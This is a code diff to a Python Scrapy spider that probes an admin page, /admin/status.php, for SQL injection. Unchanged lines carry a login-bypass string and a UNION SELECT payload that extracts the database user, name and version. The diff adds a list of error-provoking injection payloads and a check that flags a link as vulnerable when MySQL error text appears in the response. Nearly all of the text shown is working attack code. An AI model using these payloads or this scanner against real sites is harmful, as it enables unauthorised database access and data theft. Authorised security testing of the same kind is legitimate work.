@@ -18,6 +18,9 @@ attack_url = "/admin/status.php"
 #query_string = "username=1%27+OR+1%3D1%23&password=anything"
 query_string = "op=edit&status_id=1"
 payload = "'kasdgh"#"%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+error_payloads = ["+and+SLAP(10)+--+",
+					"'kasdgh",
+					"+AND+SEELCT"]
 
 class step3(Spider):
 	name = "step3"
@@ -80,5 +83,10 @@ class step3(Spider):
 		file = open("attack_response.html", "w")
 		file.write(response.body)
 		file.close()
+
+		searchterms = ["mysql error","sql syntax", "mysql server version", "unknown column", "fatal error", "stack trace"]
+		#if searchterms in response.body:
+		if any(term in response.body.lower() for term in searchterms):
+			self.log("\tVulnerable link: " + response.url, level=log.INFO)
 		return None
 	
